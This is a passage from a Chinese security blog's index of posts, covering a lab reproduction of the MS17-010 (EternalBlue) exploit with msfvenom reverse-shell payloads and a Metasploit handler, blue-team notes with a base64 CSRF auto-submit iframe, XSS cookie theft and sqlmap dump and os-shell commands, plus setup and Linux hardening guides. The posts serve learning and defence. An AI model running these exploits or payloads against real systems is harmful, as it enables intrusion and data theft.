0A4Ebur94+5mDr4Qwuuy0OiTyghpvNUCos3Lx41H4cdkkBU4DlsTQeBIcxD6Wq+fEPVzKdVsYa/di9UR8F/ahO9BmdTYFOmAqLs7+GsxnVNTNjBRXeE9A8lwoHYWnshFS4L9Mms25DO8B2Txgca5b1oD78/I/Zr4c6WuxKmaEVXRjfqP9+hO1s7OK73abXBAw= </div>]]></content>
      <categories>
        <category>杂记</category>
      </categories>
  </entry>
  <entry>
    <title>漏洞/Java反序列化漏洞</title>
    <url>/2022/07/13/%E6%BC%8F%E6%B4%9E/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="序列化和反序列化操作"><a class="header-anchor" href="#序列化和反序列化操作"></a>序列化和反序列化操作</h2>
<p>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。</p>
<p>Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。</p>
]]></content>
  </entry>
  <entry>
    <title>At the very beginning...</title>
    <url>/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/</url>
    <content><![CDATA[<p><img src="/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/h2USniLgmurJKMe.png" alt></p>
<h2 id="为什么写博客"><a class="header-anchor" href="#为什么写博客"></a>为什么写博客</h2>
<p>0.有自己的博客听起来更屌一点。</p>
<p>1.记录和分享一些学到的东西。</p>
<p>2.倒逼自己去学一些新东西。</p>
<h2 id="关于我"><a class="header-anchor" href="#关于我"></a>关于我</h2>
<p>信息安全菜鸡</p>
<p>偶尔打打ctf找虐</p>
<p>业余爱好拳击，徒步</p>
<p>QQ：MTc1NTkzNjEyOQ</p>
<p>欢迎交流 ~</p>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
  </entry>
  <entry>
    <title>hexo博客搭建</title>
    <url>/2020/04/07/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/hexo%20%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="安装配置-node-js"><a class="header-anchor" href="#安装配置-node-js"></a>安装配置 node.js</h2>
<p><a href="https://www.jianshu.com/p/13f45e24b1de">https://www.jianshu.com/p/13f45e24b1de</a></p>
<p><strong>npm to cnpm</strong></p>
<p><a href="https://www.jianshu.com/p/115594f64b41">https://www.jianshu.com/p/115594f64b41</a></p>
<h2 id="安装配置-Git"><a class="header-anchor" href="#安装配置-Git"></a>安装配置 Git</h2>
<p><a href="https://blog.csdn.net/qq_29726869/article/details/88622840">https://blog.csdn.net/qq_29726869/article/details/88622840</a></p>
<p>安装完成即可，没有必要配置ssh</p>
<h2 id="安装-hexo"><a class="header-anchor" href="#安装-hexo"></a>安装 hexo</h2>
<pre><code>cnpm install -g hexo
</code></pre>
<p>建一个博客根目录，以管理员身份运行powershell并cd到博客根目录</p>
<pre><code>hexo init
</code></pre>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>MS17-010漏洞复现</title>
    <url>/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="复现环境"><a class="header-anchor" href="#复现环境"></a>复现环境</h2>
<p>靶机：Windows server 2012 R2 standard	(192.168.233.129)</p>
<p>攻击机：Kali Linux	(192.168.233.128)</p>
<h2 id="步骤"><a class="header-anchor" href="#步骤"></a>步骤</h2>
<h3 id="环境配置"><a class="header-anchor" href="#环境配置"></a>环境配置</h3>
<p>关闭靶机防火墙</p>
<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201425575.png" alt="image-20200718201425575"></p>
<p>在window server 2012中启动Guest账号</p>
<p>开始菜单 -&gt; 管理工具 -&gt; 本地安全策略</p>
<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201705610.png" alt="image-20200718201705610"></p>
<h3 id="攻击"><a class="header-anchor" href="#攻击"></a>攻击</h3>
<p>漏洞利用工具：<a href="https://github.com/vivami/MS17-010">https://github.com/vivami/MS17-010</a></p>
<p>本次复现用到了 <code>eternalblue_kshellcode_x64.asm</code> 、<code>eternalblue_exploit8.py</code></p>
<p>下载到kali后后使用NASM工具对asm代码编译</p>
<pre><code>nasm -f bin eternalblue_kshellcode_x64.asm
</code></pre>
<p>然后利用<code>msfvenom</code>工具生成payload，用于反弹shell</p>
<pre><code>msfvenom -p windows/x64/shell/reverse_tcp -f raw -o reverse_shell.bin EXITFUNC=thread LHOST=192.168.233.128 LPORT=9090
</code></pre>
<p>将 <code>kernel shellcode</code>和 <code>userland shellcode</code> 拼接为<code>metasploit_msf.bin</code></p>
<pre><code>cat eternalblue_x64_kshellcode reverse_shell.bin &gt; metasploit_msf.bin
</code></pre>
<p>在新终端启动<code>metasploit</code> 并输入一下命令以监听反弹shell</p>
<pre><code>use exploit/multi/handler
set PAYLOAD windows/x64/shell/reverse_tcp
set LHOST 192.168.233.128
set LPORT 9090
exploit
</code></pre>
<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205527473.png" alt="image-20200718205527473"></p>
<p>回到原终端，修改<code>eternalblue_exploit8.py</code></p>
<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205908133.png" alt="image-20200718205908133"></p>
<p>保存退出，然后运行该脚本</p>
<pre><code>python eternalblue_exploit8.py 192.168.233.129 metasploit_msf.bin 500
</code></pre>
<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210137709.png" alt="image-20200718210137709"></p>
<p>运行成功，此时返回msf命令行</p>
<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210508820.png" alt="image-20200718210508820"></p>
<p>可以看到，已成功连接到靶机，并获得了system权限。</p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu (20.04)虚拟机安装配置</title>
    <url>/2020/05/12/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Ubuntu%20(20.04)%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>VMWare 安装Ubuntu系统时一般会默认使用简易安装，会有一个安装<code>open-vm-tools</code>的过程，如果在这里卡了很长时间，可以尝试关闭虚拟机再重新启动，完成安装过程</p>
<h2 id="换源"><a class="header-anchor" href="#换源"></a>换源</h2>
<p>Ubuntu安装好之后首先要做的就是换源，需要<strong>特别注意的一点</strong>是不要随便从一篇博客里复制粘贴源的地址到<code>sources.list</code>，因为每个不同版本的Ubuntu分别有自己的代号，源的链接是不同的，需要自己去官网找。</p>
<h2 id="安装中文输入法"><a class="header-anchor" href="#安装中文输入法"></a>安装中文输入法</h2>
<p>设置-&gt;区域和语言-&gt;管理已安装的语言</p>
<p>弹出<code>语言支持</code>的窗口，选择<code>添加或删除语言</code>，找到中文简体，应用，然后设置<code>地区格式</code>，应用后关闭该窗口。</p>
<p>回到<code>区域和语言</code>，设置<code>格式</code>为中国，然后注销，重新登陆，再次打开这个界面就可以添加中文输入法了。</p>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝队基础</title>
    <url>/2021/03/04/%E6%9D%82%E8%AE%B0/%E8%93%9D%E9%98%9F%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="基础知识"><a class="header-anchor" href="#基础知识"></a>基础知识</h2>
<h3 id="漏洞原理"><a class="header-anchor" href="#漏洞原理"></a>漏洞原理</h3>
<h4 id="XSS"><a class="header-anchor" href="#XSS"></a>XSS</h4>
<ul>
<li>
<p>原理</p>
<p>应用程序或API包括未经验证和未经转义的用户输入，作为HTML输出的一部分</p>
</li>
<li>
<p>危害</p>
<p>一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的HTML和JavaScript。攻击者可以获取受害者的cookie等</p>
<p>JavaScript脚本可以跨域访问，<code>&lt;script&gt;</code>标签可以请求外部的js脚本，并且外部js脚本请求来之后是被认为与被攻击服务器同源的，所以可以访问当前服务器的cookie，所以反射型XSS的利用方式：构造恶意链接，将请求恶意js脚本的<code>&lt;script&gt;</code>作为参数传给服务器，在我们的恶意js脚本中可以使用加载图片的方式，将cookie作为参数传给我们的接收服务器</p>
</li>
</ul>
<p>获取cookie：<a href="https://blog.csdn.net/l31299/article/details/72792613">https://blog.csdn.net/l31299/article/details/72792613</a></p>
<pre><code>document.cookie
</code></pre>
<ul>
<li>
<p>三种类型比较</p>
<p>反射型 XSS 一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
<p>客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和转义，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。</p>
<p>存储型XSS攻击即攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
</li>
<li>
<p>防御方法</p>
<p>过滤输入和转义处理</p>
<p>第一、在输入方面对所有用户提交内容进行输入验证，提交内容包括URL、查询关键字、http头、post数据等</p>
<p>第二、在输出方面，使用<code>htmlentities()</code>函数进行转义标签内的内容不会解释，直接显示。</p>
</li>
</ul>
<h4 id="CSRF"><a class="header-anchor" href="#CSRF"></a>CSRF</h4>
<ul>
<li>
<p>防御方法</p>
<p>检查referer：敏感操作来源不能为本站点之外</p>
<p>设置token：用以检查请求来自当前页面</p>
</li>
<li>
<p>referer检测绕过</p>
<p>http头不包含referer：使用<code>data:</code>协议</p>
<pre><code class="language-html">&lt;html&gt;
    &lt;body&gt;
       &lt;iframe src=&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;&gt;
    &lt;/body&gt; 
&lt;/html&gt;
</code></pre>
<p>非空referer</p>
<p>不断尝试，如果后端只验证referer中是否存在指定关键字，那么我们通过新建文件夹使文件夹名为该域名，文件夹下存放csrf攻击代码即可</p>
</li>
</ul>
<h4 id="SSRF"><a class="header-anchor" href="#SSRF"></a>SSRF</h4>
<ul>
<li>
<p>XXE漏洞</p>
<p>SSRF（服务器端请求伪造）是一种攻击模式</p>
<p>XXE（XML External Entity XML外部实体）则是一种攻击手法</p>
<p>XXE漏洞利用了SSRF，让服务器向其他服务器应用请求XML外部实体（DTD文件）。</p>
</li>
<li>
<p>RFI</p>
<p>RFI（远程文件包含）也是SSRF的一种形式。</p>
</li>
</ul>
<h4 id="SQLI"><a class="header-anchor" href="#SQLI"></a>SQLI</h4>
<p>报错注入函数</p>
<pre><code>floor()
extractvalue()
updatexml()
exp()
</code></pre>
<p><strong>order by 注入</strong></p>
<p>有些排序功能通过sql里的order by语句来实现，我们可以利用这一点，控制order by后面的内容</p>
<p>order by配合union进行盲注：通过排序结果逐字符比较得到结果</p>
<h3 id="端口号"><a class="header-anchor" href="#端口号"></a>端口号</h3>
<table>
<thead>
<tr>
<th>端口号</th>
<th>对应服务</th>
<th>端口号</th>
<th>对应服务</th>
</tr>
</thead>
<tbody>
<tr>
<td>21</td>
<td>ftp</td>
<td>2601 2604</td>
<td>zebra路由</td>
</tr>
<tr>
<td>22</td>
<td>ssh</td>
<td>3306</td>
<td>MySQL</td>
</tr>
<tr>
<td>23</td>
<td>telnet</td>
<td>3312</td>
<td>kangle主机管理系统</td>
</tr>
<tr>
<td>80</td>
<td>http</td>
<td>3389</td>
<td>远程桌面</td>
</tr>
<tr>
<td>80-89</td>
<td>web</td>
<td>4440</td>
<td>rundeck</td>
</tr>
<tr>
<td>161</td>
<td>snmp</td>
<td>5432</td>
<td>PostgreSQL</td>
</tr>
<tr>
<td>389</td>
<td>LDAP</td>
<td>5900</td>
<td>vnc</td>
</tr>
<tr>
<td>443</td>
<td>https（心脏滴血）</td>
<td>6379</td>
<td>redis未授权</td>
</tr>
<tr>
<td>445</td>
<td>SMB（永恒之蓝）</td>
<td>7001 7002</td>
<td>WebLogic默认弱口令，反序列</td>
</tr>
<tr>
<td>512 513 514</td>
<td>Rexec</td>
<td>8080</td>
<td>tomcat</td>
</tr>
<tr>
<td>873</td>
<td>Rsync未授权</td>
<td>8080 8089 9090</td>
<td>JBOSS</td>
</tr>
<tr>
<td>1025</td>
<td>NFS</td>
<td>8161</td>
<td>activemq未授权访问</td>
</tr>
<tr>
<td>1433</td>
<td>MSSQL</td>
<td>27017 27018</td>
<td>Mongodb未授权访问</td>
</tr>
<tr>
<td>1521</td>
<td>Oracle</td>
<td>50000</td>
<td>SAP命令执行</td>
</tr>
</tbody>
</table>
<h2 id="安全工具"><a class="header-anchor" href="#安全工具"></a>安全工具</h2>
<h3 id="扫描工具"><a class="header-anchor" href="#扫描工具"></a>扫描工具</h3>
<ul>
<li>
<p>AWVS</p>
</li>
<li>
<p>NESSUS</p>
</li>
</ul>
<pre><code class="language-shell">#启动nessus
service nessusd start
firefox https://localhost:8834

#找回用户名密码
cd /opt/nessus/sbin/
./nessuscli lsuser
./nessuscli chpasswd [username]
</code></pre>
<ul>
<li>nmap</li>
</ul>
<pre><code>//扫描C段
nmap 192.168.233.1/24
//根据IP地址范围扫描
nmap 192.168.1-10.128-140
//扫描多个目标
nmap 192,168.233.1 192.168.23.128

//参数
-p(小写)	指定端口
-O、-A	探测操作系统
-T	超时时间
</code></pre>
<ul>
<li>sqlmap</li>
</ul>
<pre><code>sqlmap.py -u &quot;http://......&quot; -p 可变的参数（如id等） --cookie &quot;......&quot; 

//当前用户 --current-user
//当前数据库 --current-db
sqlmap.py -u &quot;http://127.0.0.1/DVWA-1.9/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low;PHPSESSID=ke78jnt9j7mts8te23v69u4nh4&quot; --current-user --current-db

//-D指定数据库 然后--tables查询表
sqlmap.py -u &quot;http://127.0.0.1/DVWA-1.9/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low;PHPSESSID=ke78jnt9j7mts8te23v69u4nh4&quot; -D &quot;dvwa&quot; --tables

//-D -T指定数据库和表 然后--columns查询列
sqlmap.py -u &quot;http://127.0.0.1/DVWA-1.9/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low;PHPSESSID=ke78jnt9j7mts8te23v69u4nh4&quot; -D &quot;dvwa&quot; -T &quot;users&quot; --columns

//-C指定列然后--dump出结果
sqlmap.py -u &quot;http://127.0.0.1/DVWA-1.9/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low;PHPSESSID=ke78jnt9j7mts8te23v69u4nh4&quot; -D &quot;dvwa&quot; -T &quot;users&quot; -C &quot;user,password&quot; --dump

//get WebShell
sqlmap.py -u &quot;http://127.0.0.1/DVWA-1.9/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low;PHPSESSID=ke78jnt9j7mts8te23v69u4nh4&quot; -D &quot;dvwa&quot; -T &quot;users&quot; -C &quot;user,password&quot; --os-shell
</code></pre>
<h2 id="安全设备"><a class="header-anchor" href="#安全设备"></a>安全设备</h2>
<h3 id="WAF"><a class="header-anchor" href="#WAF"></a>WAF</h3>
<ul>
<li>本地WAF
<ul>
<li>modSecurity
<ul>
<li>作为nginx的模块，需要编译安装</li>
</ul>
</li>
<li>…</li>
</ul>
</li>
<li>云WAF
<ul>
<li>无需用户更新</li>
<li>成本低</li>
<li>可能被绕过（网站的真实IP被获取</li>
<li>阿里云WAF…</li>
</ul>
</li>
<li>部署方式
<ul>
<li>反向代理
<ul>
<li>正向代理隐藏真实客户端，反向代理隐藏真实服务端</li>
</ul>
</li>
<li>步骤
<ul>
<li>购买阿里云WAF产品</li>
<li>在阿里云WAF中添加域名</li>
<li>在服务器中设置防火墙放行来自WAF的流量</li>
<li>在拥有域名的DNS服务商处修改DNS解析</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="蜜罐"><a class="header-anchor" href="#蜜罐"></a>蜜罐</h3>
<p>Github 开源蜜罐 —— HFish</p>
<p>安装包https://github.com/hacklcx/HFish/releases</p>
<p>安装成功后启动服务即可</p>
<p>蜜罐的作用</p>
<ul>
<li>获取攻击者IP、攻击过程等信息</li>
<li>溯源取证（jsonp获取攻击者cookie…</li>
</ul>
<h3 id="态势感知平台"><a class="header-anchor" href="#态势感知平台"></a>态势感知平台</h3>
<p>多种防护系统、流量监测系统的接入整合及可视化，监控全局流量，攻击事件报警等</p>
<h3 id="IPS-IDS"><a class="header-anchor" href="#IPS-IDS"></a>IPS/IDS</h3>
<p>入侵防御系统 / 入侵检测系统。IDS工作在网络层旁路，IPS则可旁路可串结（出口/入口）。IDS只能检测，IPS则是具备截断能力的IDS。</p>
<p>IPS的旁路防护原理很简单，其经典代表如开源的Snort，就是在网络上分析流量，发现符合规则的流量则冒充服务端回包响应客户端实现阻断或者替换的目的，这是一种典型的链路劫持手法。</p>
<p><strong>绕过方法</strong></p>
<p>TCP分片、IP分片等</p>
<h2 id="攻防技术"><a class="header-anchor" href="#攻防技术"></a>攻防技术</h2>
<h3 id="常用渗透方法"><a class="header-anchor" href="#常用渗透方法"></a>常用渗透方法</h3>
<ul>
<li>利用弱口令以及通用口令</li>
<li>利用互联网边界渗透内网</li>
<li>利用通用产品组件漏洞</li>
<li>利用安全产品0Day漏洞</li>
<li>利用社工钓鱼</li>
<li>…</li>
</ul>
<h3 id="应急响应-入侵检测技术"><a class="header-anchor" href="#应急响应-入侵检测技术"></a>应急响应&amp;入侵检测技术</h3>
<p>详见这篇博客：<a href="https://dawnyh99.github.io/2021/03/08/%E8%BF%90%E7%BB%B4/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94&amp;Linux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/">应急响应&amp;Linux入侵检测</a></p>
<h3 id="CDN"><a class="header-anchor" href="#CDN"></a>CDN</h3>
<p>CDN是一个分布式边缘网络，网站A使用了CDN，用户根据域名访问网站A时，如果用户本地DNS没有网站A的路由信息，则向DNS授权服务器请求网站A的IP地址，而DNS授权服务器则根据用户的位置，选择速度最快的CDN加速节点的IP地址传回给用户，那么用户即访问了该CDN节点，而非源站。当CDN节点中没有缓存源站的部分内容时，则会向源站请求。</p>
<p><strong>判断目标网站是否使用CDN</strong></p>
<ul>
<li>使用多地ping该网站域名，若得到的IP不同，则其可能使用了CDN</li>
<li>nslookup返回的域名解析对应多个IP多半是使用了CDN</li>
</ul>
<p><strong>绕过CDN获取网站真实IP</strong></p>
<ul>
<li>DNS缓存历史查询网站</li>
<li>网络空间搜索引擎
<ul>
<li>fofa</li>
<li>钟馗之眼</li>
<li>…</li>
</ul>
</li>
<li>查询子域名IP，可能子站并没有做CDN，可能与主站处于同一C段</li>
</ul>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>kali(Debian)虚拟机的网络配置</title>
    <url>/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="网卡配置"><a class="header-anchor" href="#网卡配置"></a>网卡配置</h2>
<p>首先将虚拟机设置中的网络连接设置为<strong>桥接模式</strong>，这样虚拟网卡直接和宿主机的物理网卡桥接，这个虚拟机就可以视为和宿主机在同一局域网中（双绞线连接），方便将来的测试。</p>
<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/设置桥接模式.jpg" style="zoom:67%;">
<p>然后打开虚拟网络编辑器，点击右下方的<strong>更改设置</strong></p>
<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/虚拟网络编辑器.jpg" style="zoom:67%;">
<p>将红框部分改为你的物理网卡名称（可以在网络和共享中心-更改网络适配器中查看），如果找不到的话也可以保留<strong>自动</strong>选项，只不过这样的话后面如果把ip设置成静态的可能无法ping通外网。</p>
<p>接下来进入虚拟机，<code>ifconfig</code>  查看IP地址，子网掩码，网关</p>
<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ifconfig.jpg" alt></p>
<p>然后配置网卡eth0</p>
<pre><code>vim /etc/network/interfaces
</code></pre>
<p>若要设置IP为静态的，则插入以下几行</p>
<pre><code>auto eth0 #开机启动网卡
iface eth0 inet static
	address 192.168.xxx.xxx #上面查看的IP地址
	broadcast 192.168.xxx.xxx #上面查看的网关地址
	netmask 255.255.255.0
</code></pre>
<p>若设置为动态分配IP，则改为插入以下两行，这样设置重启后IP地址改变，需要自己注意</p>
<pre><code>auto eth0
iface eth0 inet dhcp
</code></pre>
<p><code>:wq</code>保存退出之后，重启网卡</p>
<pre><code>service networking restart
</code></pre>
<p>然后<code>ping www.baidu.com</code>测试是否正常连接，再ping一下主机ip看是否成功。</p>
<p>若主机能够ping通虚拟机，而虚拟机ping不通主机，则可能是被主机的防火墙拦截了，具体可以查看https://blog.csdn.net/hskw444273663/article/details/81301470</p>
<p>到这里，主机和虚拟机能互相ping通，则网卡设置完成☺️</p>
<h2 id="SSH配置"><a class="header-anchor" href="#SSH配置"></a>SSH配置</h2>
<p>一般来说，kali默认已经安装了SSH</p>
<p>首先查看SSH状态</p>
<pre><code>ps -e|grep ssh
</code></pre>
<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ssh%E7%8A%B6%E6%80%81.jpg" alt></p>
<p>如图所示，表示ssh服务已启动，若没有，则尝试手动启动</p>
<pre><code>sudo service ssh start
</code></pre>
<p>然后修改sshd_config</p>
<pre><code>vim /etc/ssh/sshd_config
</code></pre>
<p>找到<code>#PasswordAuthentication no</code>,把注释去掉，再把no改成yes</p>
<p>找到<code>#PermitRootLogin yes</code>,去掉注释</p>
<p>保存退出。</p>
<p>重启SSH服务</p>
<pre><code>service ssh restart
</code></pre>
<p>要使ssh开机启动，命令为：</p>
<pre><code>update-re.d ssh enable
</code></pre>
<h2 id="代理设置"><a class="header-anchor" href="#代理设置"></a>代理设置</h2>
<p>虚拟机想要连接外网，同样需要网络代理。如果宿主机已配置代理，那么直接让虚拟机连接主机代理上网即可。</p>
<p>已<code>v2ray</code>为例，在参数设置-v2rayN设置中勾选<code>允许来自局域网的连接</code>。</p>
<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105308512.png" style="zoom:80%;">
<p>确定保存后，在v2ray界面底部查看代理地址</p>
<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105508684.png" alt="image-20210320105508684"></p>
<p>返回虚拟机，设置-网络-网络代理-手动，填写你的v2ray代理地址</p>
<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105106748.png" style="zoom:67%;">
<p>最后设置浏览器代理为系统代理即可。</p>
<p>开启主机代理之后，虚拟机访问所有网站都会经过主机的代理服务器，所以在访问国内网站时可能速度较慢。</p>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
        <tag>linux</tag>
        <tag>kali</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统加固</title>
    <url>/2021/03/07/%E8%BF%90%E7%BB%B4/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/</url>
    <content><![CDATA[<h2 id="账号安全"><a class="header-anchor" href="#账号安全"></a>账号安全</h2>
<p><strong>账号相关文件</strong></p>
<pre><code class="language-bash">/etc/passwd    -- 记录了系统中各用户的一些基本属性，root可写，所有用户可读
/etc/shadow    -- 记录了所有用户的密码
/etc/group     -- 记录了用户组属性

1、检查是否存在除root之外UID为0的用户：
awk -F ':' '($3==0){print $1}' /etc/passwd

2、查询可以远程登录的帐号信息
awk '/\$1|\$6/{print $1}' /etc/shadow

3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限
more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;

4、禁用或删除多余及可疑的帐号
usermod -L user    #禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头
userdel -r user    #将删除user用户，并且将/home目录下的user目录一并删除
</code></pre>
<p><strong>修改密码策略</strong></p>
<p>vim /etc/login.defs</p>
<pre><code>PASS_MAX_DAYS      90               密码最长有效期
PASS_MIN_DAYS      10               密码修改之间最小的天数
PASS_MIN_LEN       8                密码长度
PASS_WARN_AGE      7                口令失效前多少天开始通知用户修改密码
</code></pre>
<p><strong>设置密码强度</strong></p>
<p>vim  /etc/pam.d/common-password</p>
<p>将原本的</p>
<pre><code>password requisite  pam_cracklib.so
</code></pre>
<p>修改为至少包含一个数字、一个小写字母、一个大写字母、一个特殊字符、且密码长度&gt;=8:</p>
<pre><code>password requisite  pam_cracklib.so try_first_pass retry=3 dcredit=-1 lcredit=-1 ucredit=-1 ocredit=-1 minlen=8  
</code></pre>
<p><strong>限制用户登陆</strong></p>
<p>vim  /etc/hosts.deny，若禁止192.168.0.1对服务器进行ssh的登陆，添加如下内容</p>
<pre><code>sshd : 192.168.0.1  
</code></pre>
<p><strong>限制登陆次数</strong></p>
<p>应对暴力破解，我们可以限制登陆次数为5，超过5次登陆失败就锁定**。**vim /etc/pam.d/sshd，在 #%PAM-1.0 的下面，加入下面的内容，表示当密码输入错误达到3次，就锁定用户150秒，如果root用户输入密码错误达到3次，锁定300秒。</p>
<pre><code>auth required pam_tally2.so deny=3 unlock_time=150 even_deny_root root_unlock_time300
</code></pre>
<p>锁定用户的管理：</p>
<pre><code>pam_tally2                             查看被锁定的用户

pam_tally2  --reset  -u  username      将被锁定的用户解锁
</code></pre>
<h2 id="目录-文件权限"><a class="header-anchor" href="#目录-文件权限"></a>目录&amp;文件权限</h2>
<p><strong>存储用户信息的文件</strong></p>
<p>在用户登陆中非常重要的三个文件</p>
<p>/etc/passwd 必须所有用户都可读，root用户可写 –rw-r—r— 权限值为644</p>
<p>/etc/shadow 只有root可读 –r-------- 权限值为400</p>
<p>/etc/group 必须所有用户都可读，root用户可写 –rw-r—r— 权限值为644</p>
<pre><code>chmod 644 /etc/passwd
chmod 400 /etc/shadow
chmod 644 /etc/group
</code></pre>
<p><strong>文件缺省权限设置</strong></p>
<pre><code class="language-bash">cp /etc/profile /etc/profile.bak
vim   /etc/profile
#添加以下内容
umask 022	#umask与文件创建后的默认所有权限异或结果即为初始权限
			#root创建的文件默认所有权限为666，666~022=644 (root可读可写，其他用户只可读)

#执行/etc/profile中的shell命令，直接执行umask命令设置的话重启失效
source  /etc/profile
</code></pre>
